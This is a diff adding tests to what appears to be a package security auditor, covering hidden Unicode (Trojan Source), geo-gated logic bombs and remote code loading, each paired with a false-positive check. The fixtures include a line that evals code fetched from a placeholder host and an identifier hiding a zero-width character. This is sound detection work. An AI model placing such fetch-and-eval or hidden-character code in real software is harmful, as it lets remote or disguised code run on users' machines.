@@ -401,6 +401,122 @@ test("real malicious code still blocks even when divergence is present", () => {
 });
 
 // ---------------------------------------------------------------------------
+// Tier-A detection hardening (Trojan Source, logic bombs, remote code load).
+// ---------------------------------------------------------------------------
+
+// #8 — Trojan Source: a bidi-override control reorders how code reads vs. runs.
+test("hidden-unicode: bidi-override control in source is review", () => {
+  const report = auditEvidence(require("./fixtures/hardening/bidi-trojan.json"));
+  assert.equal(report.verdict, "review");
+  assert.ok(
+    report.findings.some((f) => f.category === "hidden-unicode" && f.severity === "medium"),
+    "a bidi control character must raise a hidden-unicode finding"
+  );
+});
+
+// #8 — a zero-width character hidden inside an identifier is review.
+test("hidden-unicode: zero-width char inside an identifier is review", () => {
+  const report = auditEvidence({
+    packageName: "zw-id",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "zw-id", repository: "https://github.com/example/x" }),
+      "index.js": "const pass​word = getSecret();\nmodule.exports = pass​word;"
+    }
+  });
+  assert.equal(report.verdict, "review");
+  assert.ok(report.findings.some((f) => f.category === "hidden-unicode"));
+});
+
+// #8 FP guard: a leading BOM and emoji ZWJ sequences (zero-width joiner between
+// non-ASCII codepoints) are benign and must NOT flag.
+test("hidden-unicode: leading BOM and emoji ZWJ sequences stay safe", () => {
+  const report = auditEvidence({
+    packageName: "emoji-pkg",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "emoji-pkg", repository: "https://github.com/example/x" }),
+      "index.js": "﻿const family = '\u{1F468}‍\u{1F469}‍\u{1F467}';\nmodule.exports = family;"
+    }
+  });
+  assert.equal(report.verdict, "safe");
+  assert.ok(!report.findings.some((f) => f.category === "hidden-unicode"));
+});
+
+// #9 — logic bomb / protestware: a forceful destructive fs op gated on geo.
+test("logic-bomb: geo-gated recursive wipe is review", () => {
+  const report = auditEvidence(require("./fixtures/hardening/logic-bomb.json"));
+  assert.equal(report.verdict, "review");
+  assert.ok(
+    report.findings.some((f) => f.category === "logic-bomb" && f.severity === "medium"),
+    "geo-gated destructive op must raise a logic-bomb finding"
+  );
+});
+
+// #9 FP guard: benign build cleanup (rimraf dist, timestamp logging) with no
+// geo/locale gate must NOT flag.
+test("logic-bomb: benign build cleanup with no geo gate stays safe", () => {
+  const report = auditEvidence({
+    packageName: "build-clean",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "build-clean", repository: "https://github.com/example/x" }),
+      "build.js": "const rimraf = require('rimraf');\nrimraf.sync('dist');\nconsole.log('built at', new Date());"
+    }
+  });
+  assert.equal(report.verdict, "safe");
+  assert.ok(!report.findings.some((f) => f.category === "logic-bomb"));
+});
+
+// #9 FP guard: recursive temp cleanup next to timezone logging is normal —
+// broad timezone APIs are not treated as a gate.
+test("logic-bomb: recursive cleanup + timezone logging stays safe", () => {
+  const report = auditEvidence({
+    packageName: "tz-clean",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "tz-clean", repository: "https://github.com/example/x" }),
+      "clean.js": "const fs = require('fs');\nfs.rmSync('tmp', { recursive: true });\nconst tz = Intl.DateTimeFormat().resolvedOptions().timeZone;\nconsole.log(tz);"
+    }
+  });
+  assert.equal(report.verdict, "safe");
+  assert.ok(!report.findings.some((f) => f.category === "logic-bomb"));
+});
+
+// #5 — runtime-fetched payload: network content fed straight to an interpreter.
+test("remote-code-load: curl | sh is review", () => {
+  const report = auditEvidence(require("./fixtures/hardening/remote-code-load.json"));
+  assert.equal(report.verdict, "review");
+  assert.ok(
+    report.findings.some((f) => f.category === "remote-code-load" && f.severity === "medium"),
+    "curl | sh must raise a remote-code-load finding"
+  );
+});
+
+// #5 — eval over a freshly fetched body.
+test("remote-code-load: eval(await fetch(...)) is review", () => {
+  const report = auditEvidence({
+    packageName: "fetch-eval",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "fetch-eval", repository: "https://github.com/example/x" }),
+      "index.js": "async function go(){ eval(await fetch('https://x.example/p').then(r => r.text())); }\ngo();"
+    }
+  });
+  assert.equal(report.verdict, "review");
+  assert.ok(report.findings.some((f) => f.category === "remote-code-load"));
+});
+
+// #5 FP guard: an ordinary fetch whose body is parsed as JSON is not a
+// download-then-execute and must stay safe.
+test("remote-code-load: normal fetch + JSON parse stays safe", () => {
+  const report = auditEvidence({
+    packageName: "fetch-json",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "fetch-json", repository: "https://github.com/example/x" }),
+      "index.js": "async function go(){ const r = await fetch('https://api.example/data'); return r.json(); }\nmodule.exports = go;"
+    }
+  });
+  assert.equal(report.verdict, "safe");
+  assert.ok(!report.findings.some((f) => f.category === "remote-code-load"));
+});
+
+// ---------------------------------------------------------------------------
 // Evasion-hardening regressions (red-team pass). Each loads a fixture under
 // test/fixtures/evasion/ that defeated a behavioral HIGH before the fix.
 // ---------------------------------------------------------------------------
